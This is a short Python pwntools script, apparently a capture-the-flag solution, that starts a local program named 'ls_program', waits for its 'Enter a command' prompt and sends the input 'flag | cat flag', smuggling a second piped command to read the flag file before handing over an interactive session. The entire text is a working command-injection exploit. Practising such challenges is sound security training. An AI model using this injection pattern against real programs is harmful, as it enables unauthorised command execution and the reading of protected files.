from pwn import *

r = process('./ls_program')

r.recvuntil(b'Enter a command: ')

r.sendline(b'flag | cat flag')
r.interactive()